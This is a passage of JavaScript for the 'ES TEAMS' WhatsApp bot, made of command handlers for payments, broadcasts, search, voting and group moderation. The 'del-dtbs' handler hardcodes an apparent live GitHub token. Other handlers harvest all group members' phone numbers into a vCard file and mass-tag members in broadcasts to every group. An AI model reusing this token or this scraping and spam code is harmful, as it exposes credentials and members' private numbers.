    }
}
break;

case 'set-payment': {
    const reply = (message) => XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });
    if (!(await checkApprovedNumber(m.sender, reply))) {
        replygcXlicon(' `𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃`\n\n𝐏𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐚𝐠𝐞 𝐟𝐫𝐨𝐦 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇');
        return;
    }
    try {
        const args = text.split(',').map((arg) => arg.trim());
        if (args.length !== 3) {
            return replygcxlicon(
                '❌ *Invalid Format.*\n\n' +
                'Please use the correct format:\n' +
                '`set-payment Account Number, Bank Name, Account Name`\n\n' +
                '*Example:*\n' +
                '`set-payment 9018958092, Palmpay, Paschal Justing Etim`'
            );
        }

        const [accountNumber, bankName, accountName] = args;

        // Save account details
        if (!global.userPaymentData) global.userPaymentData = {};
        global.userPaymentData[m.sender] = {
            accountNumber,
            bankName,
            accountName,
        };

        return replygcxlicon(
            '✅ *Account Details Saved Successfully.*\n\n' +
            'You can now use `.esteams-payment` to view your saved details.'
        );
    } catch (error) {
        console.error('Error in set-payment command:', error);
        replygcxlicon('⚠️ *An error occurred while saving your details. Please try again later.*');
    }
    break;
}

case 'esteams-payment': {
    const reply = (message) => XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });
    if (!(await checkApprovedNumber(m.sender, reply))) {
        replygcxlicon(' `𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃`\n\n𝐏𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐚𝐠𝐞 𝐟𝐫𝐨𝐦 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇');
        return;
    }
    try {
        if (!global.userPaymentData || !global.userPaymentData[m.sender]) {
            return replygcxlicon(
                '❌ *No Account Details Found.*\n\n' +
                'Use `.set-payment` to save your account details first.'
            );
        }

        const { accountNumber, bankName, accountName } = global.userPaymentData[m.sender];

        return replygcxlicon(
            '🎉 *Your Account Details*\n\n' +
            `🏦 *Bank Name:* ${bankName}\n` +
            `💳 *Account Number:* ${accountNumber}\n` +
            `👤 *Account Name:* ${accountName}\n\n` +
            ' `𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇`'
        );
    } catch (error) {
        console.error('Error in esteams-payment command:', error);
        replygcxlicon('⚠️ *An error occurred while fetching your details. Please try again later.*');
    }
    break;
}

case 'convertmenu': {
    const reply = (message) => XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });
    return replygcxlicon(' `𝐓𝐇𝐈𝐒 𝐅𝐄𝐀𝐓𝐔𝐑𝐄 𝐈𝐒 𝐂𝐎𝐌𝐈𝐍𝐆 𝐒𝐎𝐎𝐍')
}
break

case 'esteams-broadcast': {
    const reply = (message) => XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });
    if (!(await checkApprovedNumber(m.sender, reply))) {
        replygcxlicon('`𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃`\n\n𝐏𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐚𝐠𝐞 𝐟𝐫𝐨𝐦 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇');
        return;
    }
    if (!isOwner) return replygcxlicon('❌ *Only the bot owner can use this command.*');

    if (!text) return replygcxlicon(`❓ *Example:* ${prefix + command} Hello everyone`);

    const groupChats = await XliconBotInc.groupFetchAllParticipating();
    const groupIds = Object.keys(groupChats);

    if (groupIds.length === 0) {
        return replygcxlicon('📭 *The bot is not in any groups.*');
    }

    // Categorize groups into open and closed
    let openGroups = [];
    let closedGroups = [];

    for (let groupId of groupIds) {
        const groupMetadata = groupChats[groupId];
        if (groupMetadata.announce) {
            closedGroups.push(groupId);
        } else {
            openGroups.push(groupId);
        }
    }

    const totalGroups = groupIds.length;
    const totalOpenGroups = openGroups.length;
    const totalClosedGroups = closedGroups.length;

    replygcxlicon(
        `📢 *Broadcast Details:*\n\n` +
        `📌 *Total Groups:* ${totalGroups}\n` +
        `📂 *Open Groups:* ${totalOpenGroups}\n` +
        `🔒 *Closed Groups:* ${totalClosedGroups}\n\n` +
        `📢 *Broadcasting your message to ${totalOpenGroups} open groups...*\n\n` +
        `\`❄️ 𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇 ❄️\``
    );

    let viewChannelLink = global.wagc; // Global channel link

    for (let groupId of openGroups) {
        try {
            // Tag all members in the group
            const groupMetadata = await XliconBotInc.groupMetadata(groupId);
            const participants = groupMetadata.participants.map((participant) => participant.id);
            
            let msg = generateWAMessageFromContent(groupId, {
                extendedTextMessage: {
                    text: `\`\`\`❄️ 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓 ❄️\`\`\`\n\n${text}\n\n\n` +
                          `\`❄️ 𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇 ❄️\``,
                    footer: `💬 Powered by ❄️𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏❄️`,
                    contextInfo: {
                        mentionedJid: participants, // Tagging all group members
                        externalAdReply: {
                            title: "❄️𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓❄️",
                            body: "Broadcast message",
                            showAdAttribution: true,
                            mediaType: 1,
                            thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
                            sourceUrl: viewChannelLink,
                        },
                    },
                },
            }, {});

            // Send the message
            await XliconBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id,
            });

            // Delay of 1 second
            await new Promise((resolve) => setTimeout(resolve, 1000));
        } catch (error) {
            console.error(`Failed to send broadcast to group ${groupId}:`, error);
        }
    }

    replygcxlicon('✅ *Broadcast completed successfully!*');
}
break;

case 'del-dtbs': {
    await XliconBotInc.sendMessage(m.chat, { react: { text: "❄️", key: m.key } });

    const fetch = require('node-fetch');
    const token = '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'; // GitHub token
    const rawFileUrl = 'https://raw.githubusercontent.com/Pstar0/ES-TEAMS-V1/refs/heads/main/ES_TEAMS-PREMIUM.json';
    const repoApiUrl = 'https://api.github.com/repos/Pstar0/ES-TEAMS-V1/contents/ES_TEAMS-PREMIUM.json';

    // Define the reply function
    const reply = (message) => {
        XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });
    };

    try {
        // Allowed numbers for validation
        const approvedNumbers = ['2348187637779'];
        const senderNumber = m.sender.split('@')[0];

        if (!approvedNumbers.includes(senderNumber)) {
            return replygcxlicon('`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄`\n\n𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐧𝐢𝐞𝐝');
        }

        // Validate input number
        if (!args[0] || !/^\d{11,15}$/.test(args[0])) {
            return reply('Please provide a valid number in international format, e.g., `.del-dtbs 2349018958092`');
        }

        const numberToDelete = args[0];

        // Fetch the current database
        const response = await fetch(rawFileUrl);
        if (!response.ok) {
            return replygcxlicon('Error fetching the current Database List. Please try again later.');
        }

        const currentDatabase = await response.json();

        if (!currentDatabase.includes(numberToDelete)) {
            return replygcxlicon('Number not found in Database List.');
        }

        // Fetch GitHub file SHA and update content
        const repoResponse = await fetch(repoApiUrl, {
            headers: { Authorization: `token ${token}` },
        });

        if (!repoResponse.ok) {
            return replygcxlicon('Error fetching the Database List. Please try again later.');
        }

        const repoData = await repoResponse.json();
        const updatedData = currentDatabase.filter((number) => number !== numberToDelete);
        const updatedContent = Buffer.from(JSON.stringify(updatedData, null, 2)).toString('base64');

        const updateResponse = await fetch(repoApiUrl, {
            method: 'PUT',
            headers: {
                Authorization: `token ${token}`,
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: `Remove number: ${numberToDelete}`,
                content: updatedContent,
                sha: repoData.sha,
            }),
        });

        if (!updateResponse.ok) {
            return replygcxlicon('Error updating the Database List. Please try again later.');
        }

        reply(`Successfully deleted ${numberToDelete} from the Database List.`);
    } catch (error) {
        console.error('Error processing del-dtbs:', error);
        replygcxlicon('An error occurred while updating the Database List. Please try again later.');
    }

    break;
}

case 'esteams-dtbs': {
    try {
        // React with a snowflake emoji
        await XliconBotInc.sendMessage(m.chat, { react: { text: "❄️", key: m.key } });

        // URL for the premium database
        const premiumDatabaseUrl = 'https://raw.githubusercontent.com/Pstar0/ES-TEAMS-V1/refs/heads/main/ES_TEAMS-PREMIUM.json?v=' + Date.now(); // Premium database

        const fetch = require('node-fetch');
        const fs = require('fs');
        const viewChannelLink = global.wagc; // Global channel link

        // Define the reply function before using it
        const reply = (message) => {
            XliconBotInc.sendMessage(
                m.chat,
                {
                    text: message,
                    footer: 'Powered by ❄️𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏❄️',
                    contextInfo: {
                        externalAdReply: {
                            title: "❄️𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄❄️",
                            body: "For more info, visit the channel.",
                            mediaType: 1,
                            thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
                            sourceUrl: viewChannelLink,
                        },
                    },
                },
                { quoted: m }
            );
        };

        // Allowed numbers for validation
        const allowedNumbers = ['2348187637779'];
        const senderNumber = m.sender.split('@')[0];

        // Check if the sender is allowed
        if (!allowedNumbers.includes(senderNumber)) {
            return reply('`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄`\n\n𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐧𝐢𝐞𝐝');
        }

        // Fetch the premium database (ES_TEAMS-PREMIUM.json)
        const premiumResponse = await fetch(premiumDatabaseUrl);

        if (!premiumResponse.ok) {
            return reply('Error fetching the premium database. Please try again later.');
        }

        const premiumText = await premiumResponse.text();  // Fetch the response as text

        // Try parsing the response as JSON
        try {
            const premiumNumbers = JSON.parse(premiumText);

            if (!premiumNumbers || premiumNumbers.length === 0) {
                return replygcxlicon('The premium database is currently empty.');
            }

            // Format the numbers for display
            const formattedNumbers = premiumNumbers
                .map((num, index) => `${index + 1}. ${num}`)
                .join('\n');

            reply(`\`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄 𝐋𝐈𝐒𝐓\`\n\n${formattedNumbers}`);
        } catch (jsonError) {
            console.error('Invalid JSON content:', premiumText);  // Log the raw content to help debug
            return reply('The premium database content is not valid JSON. Please check the file format.');
        }
    } catch (error) {
        console.error('Error processing esteams-dtbs:', error);
        XliconBotInc.sendMessage(m.chat, { text: 'An error occurred. Please try again later.' }, { quoted: m });
    }

    break;
}

case 'wikipedia': case 'wiki': {
  if (!text) return await replygcxlicon('❗ Enter what you want to search for on Wikipedia');

  try {
      // Fetch Wikipedia page content
      const link = await axios.get(`https://en.wikipedia.org/wiki/${text}`);
      const $ = cheerio.load(link.data);

      // Extract title and summary
      let wik = $('#firstHeading').text().trim();
      let resulw = $('#mw-content-text > div.mw-parser-output').find('p').text().trim();

      // Create a message body with the title and summary
      let message = `▢ *Wikipedia Search Result* 🧐\n\n`;
      message += `‣ *Title*: ${wik} 📚\n\n`;
      message += `${resulw} 📖\n`;

      // Send the response message
      await replygcxlicon(message);

  } catch (e) {
      console.error(e);
      await replygcxlicon('⚠️ No results found or failed to fetch data. Try again later!');
  }
}
break;

case 'google': {
  if (!q) return replygcxlicon(`❗ Example : ${prefix + command} ${botname}`);

  await XliconStickWait();

  let google = require('google-it');
  google({'query': text}).then(res => {
      let teks = `🔍 *Google Search Results for*: ${text}\n\n`;
      for (let g of res) {
          teks += `⭔ *Title*: ${g.title} 📑\n`;
          teks += `⭔ *Description*: ${g.snippet} 📝\n`;
          teks += `⭔ *Link*: [Click Here](${g.link}) 🌐\n\n────────────────────────\n\n`;
      }

      replygcxlicon(teks);
  }).catch(err => {
      console.error(err);
      replygcxlicon('⚠️ Error: Could not fetch results. Please try again later.');
  });
}
break;


case 'img': case 'image': case 'picture': {
  if (!text) return replygcxlicon(`*• Example:* ${prefix + command} luffy one piece,10`);
await XliconStickWait()
  try {
      // Split the input text to get the search term and the amount
      let [searchTerm, amount] = text.split(',').map(item => item.trim());
      // Default to 1 if no amount is provided
      amount = amount ? parseInt(amount) : 1;

      // Limit the maximum number of images to 30
      if (amount > 30) {
          amount = 30;
          replygcxlicon('⚠️ *Maximum limit is 30 images.* Sending 30 images.');
      } else if (amount <= 0 || isNaN(amount)) {
          return replygcxlicon('❌ *Invalid number of images.* Please enter a number between 1 and 30.');
      }

      // List of new API URLs for fetching images
      const apiUrls = [
          'https://aemt.uk.to/googleimage?query=',
          'https://meitang.xyz/googleimage?query=',
          'https://btch.us.kg/googleimage?query=',
          'https://api.tioo.eu.org/googleimage?query=',
          'https://api.tioprm.eu.org/googleimage?query='
      ];

      // Select a random API URL
      const randomApiUrl = apiUrls[Math.floor(Math.random() * apiUrls.length)];

      // Fetch the image URLs from the selected API
      let response = await fetch(randomApiUrl + encodeURIComponent(searchTerm));

      // Check if the response is okay
      if (!response.ok) {
          return replygcxlicon('❌ *Failed to fetch the images.* Please try again.');
      }

      // Parse the response JSON
      let data = await response.json();
      if (!data.result || data.result.length === 0) {
          return replygcxlicon('❌ *No images found for the given query.*');
      }

      // Select a random set of images from the fetched URLs
      let imageUrls = [];
      for (let i = 0; i < amount; i++) {
          let randomImageUrl = data.result[Math.floor(Math.random() * data.result.length)];
          imageUrls.push(randomImageUrl);
      }

      // Send each selected image with a caption
      for (let imageUrl of imageUrls) {
          try {
              let imgResponse = await fetch(imageUrl);
              if (imgResponse.status === 403) {
                  console.warn(`⚠️ *403 Forbidden* for URL: ${imageUrl}. Skipping.`);
                  continue; // Skip to the next image URL
              }

              await XliconBotInc.sendMessage(m.chat, {
                  image: { url: imageUrl },
                  caption: `🖼️ *Image Result* 🎨\n\n✨ _Here is the result of: ${searchTerm}_ 🔍`
              }, { quoted: m });
          } catch (error) {
              console.error(`❌ Error sending image ${imageUrl}:`, error);
              continue; // Continue to the next image in case of an error
          }
      }

  } catch (e) {
      console.error('⚠️ Error fetching the images:', e);
      return replygcxlicon("❗ *Error fetching the images.* Please try again.");
  }
}
break;

case 'gimage': case 'googleimg': case 'imggoogle': {
  if (!text) return replygcxlicon(`*• Example:* ${prefix + command} a girl 👧`);
await XliconStickWait()
  try {
      // List of new API URLs
      const apiUrls = [
          'https://aemt.uk.to/googleimage?query=',
          'https://meitang.xyz/googleimage?query=',
          'https://btch.us.kg/googleimage?query=',
          'https://api.tioo.eu.org/googleimage?query=',
          'https://api.tioprm.eu.org/googleimage?query='
      ];

      // Randomly select an API URL
      const apiUrl = apiUrls[Math.floor(Math.random() * apiUrls.length)] + encodeURIComponent(text);

      // Fetch the image from the selected API
      let response = await fetch(apiUrl);

      // Check if the response is okay
      if (!response.ok) {
          return replygcxlicon('❌ *Failed to fetch the image.* Please try again. 🔄');
      }

      // Get the image URL from the response
      let data = await response.json();

      if (!data.result || data.result.length === 0) {
          return replygcxlicon('❌ *No images found.* Please try again with a different search term. 🔄');
      }

      // Select a random image from the result
      let imageUrl = data.result[Math.floor(Math.random() * data.result.length)];

      // Send the image with a caption
      await XliconBotInc.sendMessage(m.chat, {
          image: { url: imageUrl },
          caption: `🌟 *Google Image Search* 🌟\n\n_*Here is the result for: ${text}*_ 📸✨`
      }, { quoted: m });

  } catch (e) {
      console.error(e);
      return replygcxlicon('❗ *Error fetching the image.* Please try again. ⚠️');
  }
}
break;



			case 'getjoinrequest':{
	if (!m.isGroup) return XliconStickGroup()
	if (!m.isBotAdmin) return XliconStickBotAdmin()
if (!m.isAdmin && !XliconTheCreator) return XliconStickAdmin()
	const response = await XliconBotInc.groupRequestParticipantsList(m.chat);
  if (!response || !response.length) {
    XliconBotInc.sendMessage(m.chat, {text: 'No pending join requests. ✅'}, {quoted:m});
    return;
  }
  let replyMessage = `${themeemoji} Join Request List:\n`;
  response.forEach((request, index) => {
    const { jid, request_method, request_time } = request;
    const formattedTime = new Date(parseInt(request_time) * 1000).toLocaleString();
    replyMessage += `\n*No.: ${index + 1} Request Details. 👇*`;
    replyMessage += `\n🧟‍♂️ *JID:* ${jid}`;
    replyMessage += `\n🧪 *Method:* ${request_method}`;
    replyMessage += `\n⏰ *Time:* ${formattedTime}\n`;
  });

  XliconBotInc.sendMessage(m.chat, {text: replyMessage}, {quoted:m});
};
break
			case 'addbadword': case 'addbd':
               if (!XliconTheCreator) return XliconStickOwner()
               if (args.length < 1) return replygcxlicon( `Send command ${prefix}addbadword [harsh word]. Example ${prefix}addbadword asshole`)
               bad.push(q)
               fs.writeFileSync('./src/badword.json', JSON.stringify(bad))
               replygcxlicon('Successfully Added Bad Word!')
            break
            case 'delbadword': case 'deldb':
               if (!XliconTheCreator) return XliconStickOwner()
               if (args.length < 1) return replygcxlicon( `Send commands ${prefix}addbadword [bad word]. Example ${prefix}addbadword asshole`)                 
               bad.splice(q)
               fs.writeFileSync('./src/badword.json', JSON.stringify(bad))
               replygcxlicon('Successfully Deleted Bad Word!')
            break 
        
        
            case 'listbadword':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of bad) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${bad.length}*`
replygcxlicon(teks)
}
break
			case 'antibadword':
case 'antitoxic': {
   if (!m.isGroup) return XliconStickGroup();
    if (!m.isBotAdmin) return await replygcxlicon('I need to be an admin to use this command.');
    if (!m.isAdmin && !XliconTheCreator) return await replygcxlicon('You need to be an admin or the bot creator to use this command.');

    if (args[0] === 'on') {
        db.groups[m.chat].badword = true;
        await replygcxlicon(`${command} is enabled.`);
    } else if (args[0] === 'off') {
        db.groups[m.chat].badword = false;
        await replygcxlicon(`${command} is disabled.`);
    } else {
        await replygcxlicon(`Hi ${m.pushName},\nPlease use the command with 'on' or 'off'.\nExample: *${prefix + command} on* or *${prefix + command} off*`);
    }
}
break;
        
        
            case 'antinsfw':
case 'nsfw': {
   if (!m.isGroup) return XliconStickGroup();
    if (!m.isBotAdmin) return await replygcxlicon('I need to be an admin to use this command.');
    if (!m.isAdmin && !XliconTheCreator) return await replygcxlicon('You need to be an admin or the bot creator to use this command.');

    if (args[0] === 'on') {
        db.groups[m.chat].ntnsfw = true;
        await replygcxlicon(`${command} is enabled.`);
    } else if (args[0] === 'off') {
        db.groups[m.chat].ntnsfw = false;
        await replygcxlicon(`${command} is disabled.`);
    } else {
        await replygcxlicon(`Hi ${m.pushName},\nPlease use the command with 'on' or 'off'.\nExample: *${prefix + command} on* or *${prefix + command} off*`);
    }
}
break;

			case 'getbio':{
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await XliconBotInc.fetchStatus(who)
    replygcxlicon(bio.status)
  } catch {
    if (text) return replygcxlicon(`bio is private or you haven't replied to the person's message!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await XliconBotInc.fetchStatus(who)
      replygcxlicon(bio.status)
    } catch {
      return replygcxlicon(`bio is private or you haven't replied to the person's message!`)
    }
  }
}
break
        
        
       
        case 'vote': {
            if (!m.isGroup) return XliconStickGroup()
            if (m.chat in vote) return replygcxlicon(`_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`)
            if (!text) return replygcxlicon(`Enter Reason for Vote, Example: *${prefix + command} Handsome Owner*`)
            replygcxlicon(`Voting starts!\n\n*${prefix}upvote* - for upvote\n*${prefix}downvote* - for downvote\n*${prefix}checkvote* - to check the vote\n*${prefix}deletevote* - to delete vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

Please Type Below
*${prefix}upvote* - to cast vote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            XliconBotInc.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
	    }
            break
               case 'upvote': {
            if (!m.isGroup) return XliconStickGroup()
            if (!(m.chat in vote)) return replygcxlicon(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replygcxlicon('You have Voted')
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            XliconBotInc.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	    }
             break
        
        
                case 'downvote': {
            if (!m.isGroup) return XliconStickGroup()
            if (!(m.chat in vote)) return replygcxlicon(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replygcxlicon('You have Voted')
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            XliconBotInc.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	}
            break
                 
case 'checkvote':
if (!m.isGroup) return XliconStickGroup()
if (!(m.chat in vote)) return replygcxlicon(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes


©${XliconBotInc.user.id}
`
XliconBotInc.sendTextWithMentions(m.chat, teks_vote, m)
break
        
        
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) return XliconStickGroup()
            if (!(m.chat in vote)) return replygcxlicon(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            delete vote[m.chat]
            replygcxlicon('Successfully Deleted Vote Session In This Group')
	    }
            break

            case 'opentime':
              if (!m.isGroup) return XliconStickGroup(); // Ensure the command is used in a group
              if (!m.isAdmin && !XliconTheCreator) return replygcxlicon(mess.admin); // Check if the user is an admin
              if (!m.isBotAdmin) return XliconStickBotAdmin(); // Check if the bot is an admin
          
              // Determine the time based on the user's input
              if (args[1] == 'second') {
                  var timer = args[0] * `1000`; // Convert to milliseconds
              } else if (args[1] == 'minute') {
                  var timer = args[0] * `60000`; // Convert to milliseconds
              } else if (args[1] == 'hour') {
                  var timer = args[0] * `3600000`; // Convert to milliseconds
              } else if (args[1] == 'day') {
                  var timer = args[0] * `86400000`; // Convert to milliseconds
              } else {
                  return replygcxlicon('*Select:*\nsecond\nminute\nhour\n\n*Example:*\n10 second');
              }
          
              // Notify about the open time
              replygcxlicon(`⏰ *Open time* ${q} starting from now...`);
          
              setTimeout(() => {
                  var nomor = m.participant;
                  const open = `🔓 *Open time*: The group is now opened by admin. Members can send messages.`;
                  XliconBotInc.groupSettingUpdate(m.chat, 'not_announcement'); // Set group to normal mode
                  replygcxlicon(open); // Notify the group that the group is open again
              }, timer);
              break;
            
        
        
              case 'editinfo': {
                if (!m.isGroup) return XliconStickGroup(); // Ensure the command is used in a group
                if (!m.isBotAdmin) return await replygcxlicon('❌ I need to be an admin to use this command.');
                if (!m.isAdmin && !XliconTheCreator) return await replygcxlicon('❌ You need to be an admin or the bot creator to use this command.');
            
                if (args[0] === 'open') {
                    await XliconBotInc.groupSettingUpdate(m.chat, 'unlocked');
                    await replygcxlicon('🔓 Successfully opened the group info edit settings. Now, all members can edit group info.');
                } else if (args[0] === 'close') {
                    await XliconBotInc.groupSettingUpdate(m.chat, 'locked');
                    await replygcxlicon('🔒 Successfully closed the group info edit settings. Only admins can edit group info now.');
                } else {
                    await replygcxlicon(`👋 Hi ${m.pushName},\nPlease use the command with 'open' or 'close'.\nExample: *${prefix + command} open* or *${prefix + command} close*`);
                }
            }
            break;
            
			case 'getcontact': case 'getcon': {
if (!m.isGroup) return XliconStickGroup()
if (!(m.isAdmin || XliconTheCreator)) return XliconStickAdmin()
xliconbigpp = await XliconBotInc.sendMessage(m.chat, {
    text: `\nGroup: *${groupMetadata.subject}*\nMember: *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000)
XliconBotInc.sendContact(m.chat, participants.map(a => a.id), xliconbigpp)
}
break
case 'savecontact': {
    const reply = (message) => XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });

    if (!(await checkApprovedNumber(m.sender, reply))) {
        replygcxlicon(' `𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃`\n\n𝐏𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐚𝐠𝐞 𝐟𝐫𝐨𝐦 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇');
        return;
    }

    await XliconBotInc.sendMessage(m.chat, { react: { text: "❄️", key: m.key } });

if (!m.isGroup) return XliconStickGroup()
if (!XliconTheCreator) return XliconStickOwner();

    let cmiggc = await XliconBotInc.groupMetadata(m.chat);
    let participants = cmiggc.participants;
    let vcard = '';
    let noPort = 1;

    for (let a of participants) {
        let contactName;

        try {
            let contact = await XliconBotInc.getContact(a.id);
            contactName = contact.notify || contact.pushName || contact.name || a.id.split("@")[0];
        } catch (error) {
            console.error(`Unable to fetch contact for ${a.id}:`, error);
        }

        if (!contactName) {
            contactName = a.notify || a.pushName || a.name || a.id.split("@")[0];
        }

        vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:${contactName}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`;
    }

    let nmfilect = './contacts.vcf';
    reply(`\n🧊𝐄𝐬 𝐓𝐞𝐚𝐦𝐬 𝐢𝐬 𝐒𝐚𝐯𝐢𝐧𝐠 𝐂𝐨𝐧𝐭𝐚𝐜𝐭𝐬, 𝐊𝐢𝐧𝐝𝐥𝐲 𝐇𝐨𝐥𝐝 𝐨𝐧..🧊 ${participants.length} contacts`);

    require('fs').writeFileSync(nmfilect, vcard.trim());
    await sleep(2000);

    await XliconBotInc.sendMessage(m.chat, {
        document: require('fs').readFileSync(nmfilect),
        mimetype: 'text/vcard',
        fileName: '𝐄𝐒 𝐓𝐄𝐀𝐌𝐒.vcf',
        caption: `\n❄️𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒 𝐂𝐎𝐍𝐓𝐀𝐂𝐓𝐒 𝐅𝐈𝐋𝐄❄️\n\n𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐒𝐚𝐯𝐞𝐝✨\n𝐆𝐫𝐨𝐮𝐩 𝐍𝐚𝐦𝐞✨: *${cmiggc.subject}*\n𝐍𝐮𝐦𝐛𝐞𝐫 𝐨𝐟 𝐂𝐨𝐧𝐭𝐚𝐜𝐭𝐬✨: *${participants.length}*\n\n𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐄𝐬 𝐓𝐞𝐚𝐦𝐬 𝐓𝐞𝐜𝐡™`
    }, { ephemeralExpiration: 86400, quoted: m });

    require('fs').unlinkSync(nmfilect);
}
break;

case 'sendcontact': case 'sencontact': {
